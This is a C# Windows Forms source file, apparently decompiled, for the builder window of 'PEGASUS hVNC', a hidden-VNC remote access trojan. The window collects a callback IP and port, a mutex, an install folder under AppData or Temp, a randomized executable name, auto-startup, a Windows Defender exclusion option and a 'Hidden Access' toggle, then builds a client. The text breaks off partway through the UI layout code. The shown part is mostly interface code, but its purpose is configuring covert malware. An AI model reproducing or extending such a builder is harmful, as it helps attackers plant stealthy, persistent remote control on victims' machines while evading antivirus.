using System;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using HVNC.Utils;

namespace HVNC
{
	public class FrmBuilder : Form
	{
		public static byte[] b;

		public static Random r = new Random();

		public static Random random = new Random();

		private Guna2Button BuildBtn;

		private Guna2CustomCheckBox checkBox2;

		private Guna2ComboBox comboBox1;

		private IContainer components;

		private Guna2CustomCheckBox EnableStartUpBox;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ControlBox guna2ControlBox1;

		private Guna2ControlBox guna2ControlBox2;

		private Guna2CustomCheckBox guna2CustomCheckBox1;

		private Guna2DragControl guna2DragControl1;

		private Guna2GroupBox guna2GroupBox1;

		private Guna2ShadowForm guna2ShadowForm1;

		private Guna2CustomCheckBox HiddenAccess;

		private Label label1;

		private Label label10;

		private Label label11;

		private Label label12;

		private Label label13;

		private Label label17;

		private Label label18;

		private Label label2;

		private Label label24;

		private Label label3;

		private Label label4;

		private Label label5;

		private Label label6;

		private Label label7;

		private Label label9;

		private Guna2Button LANBtn;

		private Panel panel1;

		private PictureBox pictureBox1;

		private Guna2Button RandomFolderName;

		private Guna2Button RandomMutexBtn;

		private Guna2TextBox textBox1;

		private Guna2TextBox textBox2;

		private Guna2TextBox txtIdentifier;

		private Guna2TextBox txtIP;

		private Guna2TextBox txtMutex;

		private Guna2TextBox txtPORT;

		private Guna2Button WanBtn;

		public FrmBuilder(string port)
		{
			InitializeComponent();
			txtPORT.Text = port;
		}

		private void button1_Click(object sender, EventArgs e)
		{
			if (txtIP.Text == "IP ADDRESS")
			{
				MessageBox.Show("IP or DNS is required in order to build.", "PEGASUS hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				Build();
			}
		}

		public void OfflineBuild()
		{
			try
			{
				RandomMutexBtn.Enabled = false;
				if (string.IsNullOrWhiteSpace(txtIP.Text) || string.IsNullOrWhiteSpace(txtPORT.Text))
				{
					MessageBox.Show("All fields are required", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					return;
				}
				BuildBtn.Enabled = false;
				BuildInfo.ip = txtIP.Text;
				BuildInfo.port = txtPORT.Text;
				BuildInfo.id = txtIdentifier.Text;
				BuildInfo.mutex = txtMutex.Text;
				BuildInfo.startup = "False";
				BuildInfo.hhvnc = "False";
				if (EnableStartUpBox.Checked)
				{
					BuildInfo.startup = "True";
				}
				else if (!EnableStartUpBox.Checked)
				{
					BuildInfo.startup = "False";
				}
				BuildInfo.path = "-1";
				if (comboBox1.SelectedIndex == -1)
				{
					BuildInfo.path = "-1";
				}
				else if (comboBox1.SelectedIndex == 0)
				{
					BuildInfo.path = "0";
				}
				else if (comboBox1.SelectedIndex == 1)
				{
					BuildInfo.path = "1";
				}
				else if (comboBox1.SelectedIndex == 2)
				{
					BuildInfo.path = "2";
				}
				BuildInfo.folder = textBox1.Text;
				BuildInfo.filename = textBox2.Text;
				BuildInfo.wdex = "False";
				if (checkBox2.Checked)
				{
					BuildInfo.wdex = "True";
				}
				else if (!checkBox2.Checked)
				{
					BuildInfo.wdex = "False";
				}
				if (HiddenAccess.Checked)
				{
					BuildInfo.hhvnc = "True";
				}
				else if (!HiddenAccess.Checked)
				{
					BuildInfo.hhvnc = "False";
				}
				new FrmBuilderStatus().ShowDialog();
				BuildBtn.Enabled = true;
			}
			catch (Exception)
			{
				MessageBox.Show("Error Build !", "Error !", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				BuildBtn.Enabled = true;
			}
		}

		public void Build()
		{
			try
			{
				RandomMutexBtn.Enabled = false;
				if (string.IsNullOrWhiteSpace(txtIP.Text) || string.IsNullOrWhiteSpace(txtPORT.Text))
				{
					MessageBox.Show("All fields are required", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					return;
				}
				BuildBtn.Enabled = false;
				BuildInfo.ip = txtIP.Text;
				BuildInfo.port = txtPORT.Text;
				BuildInfo.id = txtIdentifier.Text;
				BuildInfo.mutex = txtMutex.Text;
				BuildInfo.startup = "False";
				BuildInfo.hhvnc = "False";
				if (EnableStartUpBox.Checked)
				{
					BuildInfo.startup = "True";
				}
				else if (!EnableStartUpBox.Checked)
				{
					BuildInfo.startup = "False";
				}
				BuildInfo.path = "-1";
				if (comboBox1.SelectedIndex == -1)
				{
					BuildInfo.path = "-1";
				}
				else if (comboBox1.SelectedIndex == 0)
				{
					BuildInfo.path = "0";
				}
				else if (comboBox1.SelectedIndex == 1)
				{
					BuildInfo.path = "1";
				}
				else if (comboBox1.SelectedIndex == 2)
				{
					BuildInfo.path = "2";
				}
				BuildInfo.folder = textBox1.Text;
				BuildInfo.filename = textBox2.Text;
				BuildInfo.wdex = "False";
				if (checkBox2.Checked)
				{
					BuildInfo.wdex = "True";
				}
				else if (!checkBox2.Checked)
				{
					BuildInfo.wdex = "False";
				}
				if (HiddenAccess.Checked)
				{
					BuildInfo.hhvnc = "True";
				}
				else if (!HiddenAccess.Checked)
				{
					BuildInfo.hhvnc = "False";
				}
				new FrmBuilderStatus().ShowDialog();
				BuildBtn.Enabled = true;
			}
			catch (Exception)
			{
				MessageBox.Show("Error Build !", "Error !", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				BuildBtn.Enabled = true;
			}
		}

		private void FrmBuilder_Load(object sender, EventArgs e)
		{
			txtMutex.Text = RandomMutex(9);
			textBox1.Text = RandomMutex(9);
			textBox2.Text = RandomMutex(9) + ".exe";
		}

		public static string RandomMutex(int length)
		{
			return new string((from s in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", length)
				select s[random.Next(s.Length)]).ToArray());
		}

		public static string RandomNumber(int length)
		{
			return new string((from s in Enumerable.Repeat("0123456789", length)
				select s[random.Next(s.Length)]).ToArray());
		}

		private void button2_Click(object sender, EventArgs e)
		{
			txtMutex.Text = RandomMutex(9);
		}

		private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
		{
		}

		private void button3_Click(object sender, EventArgs e)
		{
			textBox1.Text = RandomMutex(9);
			textBox2.Text = RandomMutex(9) + ".exe";
		}

		public static string GetLocalIPAddress()
		{
			IPAddress[] addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
			foreach (IPAddress iPAddress in addressList)
			{
				if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
				{
					return iPAddress.ToString();
				}
			}
			throw new Exception("No network adapters with an IPv4 address in the system!");
		}

		private void LANBtn_Click(object sender, EventArgs e)
		{
			txtIP.Text = GetLocalIPAddress();
		}

		public async void definewanip()
		{
			string pubIp = new WebClient().DownloadString("https://ifconfig.me/ip");
			await Task.Delay(500);
			txtIP.Text = pubIp;
		}

		private void WanBtn_Click(object sender, EventArgs e)
		{
			try
			{
				if (string.IsNullOrWhiteSpace(txtIP.Text))
				{
					definewanip();
				}
				else
				{
					definewanip();
				}
			}
			catch (Exception)
			{
				MessageBox.Show("An Error Occured While Trying To Retreive Your WAN IP, Please Type It Manually.");
			}
		}

		private void HiddenAccess_CheckedChanged(object sender, EventArgs e)
		{
			_ = HiddenAccess.Checked;
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.FrmBuilder));
			panel1 = new System.Windows.Forms.Panel();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			label18 = new System.Windows.Forms.Label();
			guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
			guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
			guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(components);
			label7 = new System.Windows.Forms.Label();
			label6 = new System.Windows.Forms.Label();
			label5 = new System.Windows.Forms.Label();
			label3 = new System.Windows.Forms.Label();
			label4 = new System.Windows.Forms.Label();
			txtIdentifier = new Guna.UI2.WinForms.Guna2TextBox();
			txtMutex = new Guna.UI2.WinForms.Guna2TextBox();
			textBox2 = new Guna.UI2.WinForms.Guna2TextBox();
			textBox1 = new Guna.UI2.WinForms.Guna2TextBox();
			RandomMutexBtn = new Guna.UI2.WinForms.Guna2Button();
			comboBox1 = new Guna.UI2.WinForms.Guna2ComboBox();
			RandomFolderName = new Guna.UI2.WinForms.Guna2Button();
			label24 = new System.Windows.Forms.Label();
			label17 = new System.Windows.Forms.Label();
			checkBox2 = new Guna.UI2.WinForms.Guna2CustomCheckBox();
			EnableStartUpBox = new Guna.UI2.WinForms.Guna2CustomCheckBox();
			guna2GroupBox1 = new Guna.UI2.WinForms.Guna2GroupBox();
			label12 = new System.Windows.Forms.Label();
			label13 = new System.Windows.Forms.Label();
			label11 = new System.Windows.Forms.Label();
			txtIP = new Guna.UI2.WinForms.Guna2TextBox();
			txtPORT = new Guna.UI2.WinForms.Guna2TextBox();
			label2 = new System.Windows.Forms.Label();
			label1 = new System.Windows.Forms.Label();
			guna2CustomCheckBox1 = new Guna.UI2.WinForms.Guna2CustomCheckBox();
			HiddenAccess = new Guna.UI2.WinForms.Guna2CustomCheckBox();
			label9 = new System.Windows.Forms.Label();
			label10 = new System.Windows.Forms.Label();
			WanBtn = new Guna.UI2.WinForms.Guna2Button();
			LANBtn = new Guna.UI2.WinForms.Guna2Button();
			BuildBtn = new Guna.UI2.WinForms.Guna2Button();
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			guna2GroupBox1.SuspendLayout();
			SuspendLayout();
			panel1.BackColor = System.Drawing.Color.FromArgb(191, 38, 33);
			panel1.Controls.Add(pictureBox1);
			panel1.Controls.Add(label18);
			panel1.Controls.Add(guna2ControlBox2);
			panel1.Controls.Add(guna2ControlBox1);
			panel1.Dock = System.Windows.Forms.DockStyle.Top;
			panel1.Location = new System.Drawing.Point(0, 0);
			panel1.Name = "panel1";
			panel1.Size = new System.Drawing.Size(430, 53);
			panel1.TabIndex = 13;
			pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			pictureBox1.Location = new System.Drawing.Point(3, 3);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(67, 43);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			pictureBox1.TabIndex = 145;
			pictureBox1.TabStop = false;
			label18.AutoSize = true;
			label18.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label18.Location = new System.Drawing.Point(88, 22);
			label18.Name = "label18";
			label18.Size = new System.Drawing.Size(222, 24);
			label18.TabIndex = 2;
			label18.Text = "PEGASUS HVNC Builder";
			guna2ControlBox2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox2.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
			guna2ControlBox2.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.HoverState.Parent = guna2ControlBox2;
			guna2ControlBox2.IconColor = System.Drawing.Color.White;
			guna2ControlBox2.Location = new System.Drawing.Point(331, 4);
			guna2ControlBox2.Name = "guna2ControlBox2";
			guna2ControlBox2.ShadowDecoration.Parent = guna2ControlBox2;
			guna2ControlBox2.Size = new System.Drawing.Size(45, 42);
			guna2ControlBox2.TabIndex = 0;
			guna2ControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox1.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox1.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox1.HoverState.Parent = guna2ControlBox1;
			guna2ControlBox1.IconColor = System.Drawing.Color.White;
			guna2ControlBox1.Location = new System.Drawing.Point(382, 4);
			guna2ControlBox1.Name = "guna2ControlBox1";
			guna2ControlBox1.ShadowDecoration.Parent = guna2ControlBox1;
			guna2ControlBox1.Size = new System.Drawing.Size(45, 42);
			guna2ControlBox1.TabIndex = 0;
			guna2DragControl1.DockIndicatorTransparencyValue = 0.6;
			guna2DragControl1.TargetControl = panel1;
			guna2DragControl1.TransparentWhileDrag = true;
			guna2DragControl1.UseTransparentDrag = true;
			label7.AutoSize = true;
			label7.BackColor = System.Drawing.Color.Transparent;
			label7.Location = new System.Drawing.Point(23, 355);
			label7.Name = "label7";
			label7.Size = new System.Drawing.Size(66, 15);
			label7.TabIndex = 13;
			label7.Text = "File name :";
			label6.AutoSize = true;
			label6.BackColor = System.Drawing.Color.Transparent;
			label6.Location = new System.Drawing.Point(219, 192);
			label6.Name = "label6";
			label6.Size = new System.Drawing.Size(97, 15);
			label6.TabIndex = 10;
			label6.Text = "Random Folder :";
			label5.AutoSize = true;
			label5.BackColor = System.Drawing.Color.Transparent;
			label5.Location = new System.Drawing.Point(23, 287);
			label5.Name = "label5";
			label5.Size = new System.Drawing.Size(126, 15);
			label5.TabIndex = 8;
			label5.Text = "Installation Location :";
			label3.AutoSize = true;
			label3.BackColor = System.Drawing.Color.Transparent;
			label3.Location = new System.Drawing.Point(219, 51);
			label3.Name = "label3";
			label3.Size = new System.Drawing.Size(130, 15);
			label3.TabIndex = 5;
			label3.Text = "Country Group Name :";
			label4.AutoSize = true;
			label4.BackColor = System.Drawing.Color.Transparent;
			label4.Location = new System.Drawing.Point(219, 105);
			label4.Name = "label4";
			label4.Size = new System.Drawing.Size(93, 15);
			label4.TabIndex = 8;
			label4.Text = "Process Mutex:";
			txtIdentifier.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			txtIdentifier.BorderThickness = 3;
			txtIdentifier.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtIdentifier.DefaultText = "Client";
			txtIdentifier.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			txtIdentifier.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			txtIdentifier.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtIdentifier.DisabledState.Parent = txtIdentifier;
			txtIdentifier.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtIdentifier.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			txtIdentifier.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			txtIdentifier.FocusedState.Parent = txtIdentifier;
			txtIdentifier.Font = new System.Drawing.Font("Electrolize", 9f);
			txtIdentifier.ForeColor = System.Drawing.Color.White;
			txtIdentifier.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			txtIdentifier.HoverState.Parent = txtIdentifier;
			txtIdentifier.Location = new System.Drawing.Point(222, 71);
			txtIdentifier.Name = "txtIdentifier";
			txtIdentifier.PasswordChar = '\0';
			txtIdentifier.PlaceholderText = "";
			txtIdentifier.SelectedText = "";
			txtIdentifier.SelectionStart = 6;
			txtIdentifier.ShadowDecoration.Parent = txtIdentifier;
			txtIdentifier.Size = new System.Drawing.Size(167, 24);
			txtIdentifier.TabIndex = 17;
			txtMutex.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			txtMutex.BorderThickness = 3;
			txtMutex.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtMutex.DefaultText = "";
			txtMutex.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			txtMutex.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			txtMutex.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtMutex.DisabledState.Parent = txtMutex;
			txtMutex.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtMutex.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			txtMutex.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			txtMutex.FocusedState.Parent = txtMutex;
			txtMutex.Font = new System.Drawing.Font("Electrolize", 9f);
			txtMutex.ForeColor = System.Drawing.Color.White;
			txtMutex.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			txtMutex.HoverState.Parent = txtMutex;
			txtMutex.Location = new System.Drawing.Point(222, 125);
			txtMutex.Name = "txtMutex";
			txtMutex.PasswordChar = '\0';
			txtMutex.PlaceholderText = "";
			txtMutex.SelectedText = "";
			txtMutex.ShadowDecoration.Parent = txtMutex;
			txtMutex.Size = new System.Drawing.Size(167, 24);
			txtMutex.TabIndex = 17;
			textBox2.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			textBox2.BorderThickness = 3;
			textBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
			textBox2.DefaultText = "";
			textBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			textBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			textBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			textBox2.DisabledState.Parent = textBox2;
			textBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			textBox2.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			textBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			textBox2.FocusedState.Parent = textBox2;
			textBox2.Font = new System.Drawing.Font("Electrolize", 9f);
			textBox2.ForeColor = System.Drawing.Color.White;
			textBox2.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			textBox2.HoverState.Parent = textBox2;
			textBox2.Location = new System.Drawing.Point(26, 374);
			textBox2.Name = "textBox2";
			textBox2.PasswordChar = '\0';
			textBox2.PlaceholderText = "";
			textBox2.SelectedText = "";
			textBox2.ShadowDecoration.Parent = textBox2;
			textBox2.Size = new System.Drawing.Size(167, 24);
			textBox2.TabIndex = 17;
			textBox1.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			textBox1.BorderThickness = 3;
			textBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
			textBox1.DefaultText = "";
			textBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			textBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			textBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			textBox1.DisabledState.Parent = textBox1;
			textBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			textBox1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			textBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			textBox1.FocusedState.Parent = textBox1;
			textBox1.Font = new System.Drawing.Font("Electrolize", 9f);
			textBox1.ForeColor = System.Drawing.Color.White;
			textBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			textBox1.HoverState.Parent = textBox1;
			textBox1.Location = new System.Drawing.Point(222, 211);
			textBox1.Name = "textBox1";
			textBox1.PasswordChar = '\0';
			textBox1.PlaceholderText = "";
			textBox1.SelectedText = "";
			textBox1.ShadowDecoration.Parent = textBox1;
			textBox1.Size = new System.Drawing.Size(167, 24);
			textBox1.TabIndex = 17;
			RandomMutexBtn.Animated = true;
			RandomMutexBtn.BackColor = System.Drawing.Color.FromArgb(191, 38, 33);
			RandomMutexBtn.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			RandomMutexBtn.CheckedState.Parent = RandomMutexBtn;
			RandomMutexBtn.CustomImages.Parent = RandomMutexBtn;
			RandomMutexBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			RandomMutexBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			RandomMutexBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			RandomMutexBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			RandomMutexBtn.DisabledState.Parent = RandomMutexBtn;
			RandomMutexBtn.FillColor = System.Drawing.Color.FromArgb(191, 38, 33);
			RandomMutexBtn.Font = new System.Drawing.Font("Electrolize", 9f);
			RandomMutexBtn.ForeColor = System.Drawing.Color.White;
			RandomMutexBtn.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			RandomMutexBtn.HoverState.FillColor = System.Drawing.Color.FromArgb(191, 38, 33);
			RandomMutexBtn.HoverState.Parent = RandomMutexBtn;
			RandomMutexBtn.Location = new System.Drawing.Point(222, 155);
			RandomMutexBtn.Name = "RandomMutexBtn";
			RandomMutexBtn.PressedColor = System.Drawing.Color.FromArgb(191, 38, 33);
			RandomMutexBtn.ShadowDecoration.Parent = RandomMutexBtn;
			RandomMutexBtn.Size = new System.Drawing.Size(167, 25);
			RandomMutexBtn.TabIndex = 18;
			RandomMutexBtn.Text = "Random";
			RandomMutexBtn.Click += new System.EventHandler(button2_Click);
			comboBox1.BackColor = System.Drawing.Color.Transparent;
			comboBox1.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			comboBox1.BorderThickness = 3;
			comboBox1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
			comboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
			comboBox1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			comboBox1.FocusedColor = System.Drawing.Color.FromArgb(191, 38, 33);
			comboBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			comboBox1.FocusedState.Parent = comboBox1;
			comboBox1.Font = new System.Drawing.Font("Electrolize", 10f);
			comboBox1.ForeColor = System.Drawing.Color.Gainsboro;
			comboBox1.HoverState.Parent = comboBox1;
			comboBox1.ItemHeight = 30;
			comboBox1.Items.AddRange(new object[3] { "%AppData%\\Local", "%AppData%\\Roaming", "%AppData%\\Local\\Temp" });
			comboBox1.ItemsAppearance.Parent = comboBox1;
			comboBox1.Location = new System.Drawing.Point(26, 307);
			comboBox1.Name = "comboBox1";
			comboBox1.ShadowDecoration.Color = System.Drawing.Color.FromArgb(22, 22, 22);
			comboBox1.ShadowDecoration.Parent = comboBox1;
			comboBox1.Size = new System.Drawing.Size(167, 36);
			comboBox1.TabIndex = 18;
			comboBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
			RandomFolderName.Animated = true;
			RandomFolderName.BackColor = System.Drawing.Color.FromArgb(191, 38, 33);
			RandomFolderName.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			RandomFolderName.CheckedState.Parent = RandomFolderName;
			RandomFolderName.CustomImages.Parent = RandomFolderName;
			RandomFolderName.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			RandomFolderName.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			RandomFolderName.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			RandomFolderName.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			RandomFolderName.DisabledState.Parent = RandomFolderName;
			RandomFolderName.FillColor = System.Drawing.Color.FromArgb(191, 38, 33);
			RandomFolderName.Font = new System.Drawing.Font("Electrolize", 9f);
			RandomFolderName.ForeColor = System.Drawing.Color.White;
			RandomFolderName.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			RandomFolderName.HoverState.FillColor = System.Drawing.Color.FromArgb(191, 38, 33);
			RandomFolderName.HoverState.Parent = RandomFolderName;
			RandomFolderName.Location = new System.Drawing.Point(222, 244);
			RandomFolderName.Name = "RandomFolderName";
			RandomFolderName.PressedColor = System.Drawing.Color.FromArgb(191, 38, 33);
			RandomFolderName.ShadowDecoration.Parent = RandomFolderName;
			RandomFolderName.Size = new System.Drawing.Size(167, 25);
			RandomFolderName.TabIndex = 19;
			RandomFolderName.Text = "Random";
			RandomFolderName.Click += new System.EventHandler(button3_Click);
			label24.AutoSize = true;
			label24.BackColor = System.Drawing.Color.Transparent;
			label24.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label24.ForeColor = System.Drawing.Color.Gainsboro;
			label24.Location = new System.Drawing.Point(54, 258);
			label24.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label24.Name = "label24";
			label24.Size = new System.Drawing.Size(80, 16);
			label24.TabIndex = 81;
			label24.Text = "Auto Startup";
			label17.AutoSize = true;
			label17.BackColor = System.Drawing.Color.Transparent;
			label17.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label17.ForeColor = System.Drawing.Color.Gainsboro;
			label17.Location = new System.Drawing.Point(54, 410);
			label17.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label17.Name = "label17";
			label17.Size = new System.Drawing.Size(90, 16);
			label17.TabIndex = 81;
			label17.Text = "WD exclusion";
			checkBox2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			checkBox2.CheckedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			checkBox2.CheckedState.BorderRadius = 2;
			checkBox2.CheckedState.BorderThickness = 2;
			checkBox2.CheckedState.FillColor = System.Drawing.Color.FromArgb(191, 38, 33);
			checkBox2.CheckedState.Parent = checkBox2;
			checkBox2.ForeColor = System.Drawing.Color.White;
			checkBox2.Location = new System.Drawing.Point(26, 404);
			checkBox2.Name = "checkBox2";
			checkBox2.ShadowDecoration.Parent = checkBox2;
			checkBox2.Size = new System.Drawing.Size(23, 23);
			checkBox2.TabIndex = 126;
			checkBox2.Text = "guna2CustomCheckBox1";
			checkBox2.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			checkBox2.UncheckedState.BorderRadius = 2;
			checkBox2.UncheckedState.BorderThickness = 2;
			checkBox2.UncheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			checkBox2.UncheckedState.Parent = checkBox2;
			EnableStartUpBox.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			EnableStartUpBox.CheckedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			EnableStartUpBox.CheckedState.BorderRadius = 2;
			EnableStartUpBox.CheckedState.BorderThickness = 2;
			EnableStartUpBox.CheckedState.FillColor = System.Drawing.Color.FromArgb(191, 38, 33);
			EnableStartUpBox.CheckedState.Parent = EnableStartUpBox;
			EnableStartUpBox.ForeColor = System.Drawing.Color.White;
			EnableStartUpBox.Location = new System.Drawing.Point(26, 254);
			EnableStartUpBox.Name = "EnableStartUpBox";
			EnableStartUpBox.ShadowDecoration.Parent = EnableStartUpBox;
			EnableStartUpBox.Size = new System.Drawing.Size(23, 23);
			EnableStartUpBox.TabIndex = 126;
			EnableStartUpBox.Text = "guna2CustomCheckBox1";
			EnableStartUpBox.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			EnableStartUpBox.UncheckedState.BorderRadius = 2;
			EnableStartUpBox.UncheckedState.BorderThickness = 2;
			EnableStartUpBox.UncheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			EnableStartUpBox.UncheckedState.Parent = EnableStartUpBox;
			guna2GroupBox1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GroupBox1.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2GroupBox1.BorderThickness = 5;
			guna2GroupBox1.Controls.Add(label12);
			guna2GroupBox1.Controls.Add(label13);
			guna2GroupBox1.Controls.Add(label11);
			guna2GroupBox1.Controls.Add(txtIP);
			guna2GroupBox1.Controls.Add(txtPORT);
			guna2GroupBox1.Controls.Add(label2);
			guna2GroupBox1.Controls.Add(label1);
			guna2GroupBox1.Controls.Add(EnableStartUpBox);
			guna2GroupBox1.Controls.Add(label6);
			guna2GroupBox1.Controls.Add(guna2CustomCheckBox1);
			guna2GroupBox1.Controls.Add(HiddenAccess);
			guna2GroupBox1.Controls.Add(checkBox2);
			guna2GroupBox1.Controls.Add(txtMutex);
			guna2GroupBox1.Controls.Add(comboBox1);
			guna2GroupBox1.Controls.Add(label3);
			guna2GroupBox1.Controls.Add(textBox1);
			guna2GroupBox1.Controls.Add(label4);
			guna2GroupBox1.Controls.Add(label7);
			guna2GroupBox1.Controls.Add(label9);
			guna2GroupBox1.Controls.Add(label10);
			guna2GroupBox1.Controls.Add(label24);
			guna2GroupBox1.Controls.Add(label17);
			guna2GroupBox1.Controls.Add(RandomMutexBtn);
			guna2GroupBox1.Controls.Add(label5);
			guna2GroupBox1.Controls.Add(txtIdentifier);
			guna2GroupBox1.Controls.Add(WanBtn);
			guna2GroupBox1.Controls.Add(LANBtn);
			guna2GroupBox1.Controls.Add(RandomFolderName);
			guna2GroupBox1.Controls.Add(textBox2);
			guna2GroupBox1.CustomBorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2GroupBox1.FillColor = System.Drawing.Color.Transparent;
			guna2GroupBox1.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GroupBox1.ForeColor = System.Drawing.Color.Gainsboro;
			guna2GroupBox1.Location = new System.Drawing.Point(8, 67);
			guna2GroupBox1.Name = "guna2GroupBox1";
			guna2GroupBox1.ShadowDecoration.Parent = guna2GroupBox1;
			guna2GroupBox1.Size = new System.Drawing.Size(412, 497);
			guna2GroupBox1.TabIndex = 129;
